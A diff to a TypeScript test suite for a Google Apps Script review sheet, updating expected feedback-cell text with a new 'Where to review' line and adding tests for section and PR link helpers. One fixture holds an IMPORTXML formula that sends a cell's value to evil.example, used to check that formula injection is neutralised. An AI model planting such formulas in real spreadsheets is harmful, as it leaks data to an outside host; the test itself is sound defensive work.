@@ -698,15 +698,15 @@ describe("review-sheet.gs in drafting mode", () => {
     const rt2 = runtime(t);
     const s = load(code, rt2.g);
     s.refreshAll();
-    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
     f[1][1] = "Define registry and register";
     s.refreshAll();
     const stale = T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0]) as string;
-    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\nDefine it in 1\.1$/);
+    expect(stale).toMatch(/^\u26a0 Stale: .*\n\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current\.\n\u21b3 Where to review.*\nDefine it in 1\.1$/);
     f[1][1] = "Define registry";
     f[1][9] = stale;
     s.refreshAll();
-    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\nDefine it in 1.1");
+    expect(T(rt2.written["Contributor Feedback"]["Contributor Feedback (agent)"][0][0])).toBe("\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\nDefine it in 1.1");
   });
 
   test("the agent column under its new name, Feedback (agent), is read the same, and never counts as a person's feedback", () => {
@@ -723,7 +723,7 @@ describe("review-sheet.gs in drafting mode", () => {
     expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).not.toMatch(/Stale/);
     f[1][1] = "A new title";
     s.refreshAll();
-    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\nQuestion for the editor/);
+    expect(String(T(rt2.written["Contributor Feedback"]["Feedback (agent)"][0][0]))).toMatch(/^\u26a0 Stale: .*\n\u23f3 .*\n\u21b3 Where to review.*\nQuestion for the editor/);
   });
 
   test("a new empty feedback column marks nothing stale, and a basis written the older way still matches", () => {
@@ -886,7 +886,7 @@ describe("review-sheet.gs in drafting mode", () => {
     load(code, rt2.g).refreshAll();
     const w = rt2.written["Contributor Feedback"];
     // The progress line now leads, so the cell cannot start as a formula.
-    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
+    expect(T(w["Contributor Feedback (agent)"][0][0])).toBe('\u23f3 dth#40 open, updated 2026-10-30 23:40Z; preview current.\n\u21b3 Where to review (preview): Ch 1 Why it matters \u00b7 1.1 Global challenges\n=IMPORTXML("https://evil.example/?"&A1,"//a")');
     expect(String(w["Selected Sections"][1][0]).startsWith("'=")).toBe(true);
   });
 
@@ -1719,5 +1719,26 @@ describe("Needs you only with a question (Q-FBK-1 A)", () => {
     const [a, z, u] = out.links[0];
     expect(u).toBe(url);
     expect(out.text.slice(a, z)).toBe("dth-hrh#81");
+  });
+});
+
+describe("Where to review and PR links (Q-FBK-3 A)", () => {
+  const fns = new Function("SpreadsheetApp", "CFG", `${code.replace(/^(const|let) CFG\b.*$/m, "")}\nreturn { whereLine, previewSection, autoLinks, withWhere };`)({}, { REPO_URL: "https://github.com/litlfred/dth-hrh" }) as any;
+  const toc = { "4.1 Scope": "https://litlfred.github.io/dth-hrh/en/dth-hrh/#sec-4-1" };
+  test("links each selected section on the preview while there is one", () => {
+    const w = fns.whereLine(["4.1 Scope"], toc, "https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/review/");
+    expect(w.text).toBe("↳ Where to review (preview): 4.1 Scope");
+    expect(w.links[0][2]).toBe("https://litlfred.github.io/dth-hrh/STAGING/claude-x/en/dth-hrh/#sec-4-1");
+    expect(w.text.slice(w.links[0][0], w.links[0][1])).toBe("4.1 Scope");
+  });
+  test("falls back to the published draft, and flags no section", () => {
+    expect(fns.whereLine(["4.1 Scope"], toc, "").links[0][2]).toBe(toc["4.1 Scope"]);
+    expect(fns.whereLine([], toc, "").text).toMatch(/No section selected/);
+  });
+  test("every repo#n becomes a link", () => {
+    const t = "Draft PR dth-hrh#82 and smart-ra#198.";
+    const l = fns.autoLinks(t, []);
+    expect(l.map((x: any) => t.slice(x[0], x[1]))).toEqual(["dth-hrh#82", "smart-ra#198"]);
+    expect(l[0][2]).toBe("https://github.com/litlfred/dth-hrh/issues/82");
   });
 });
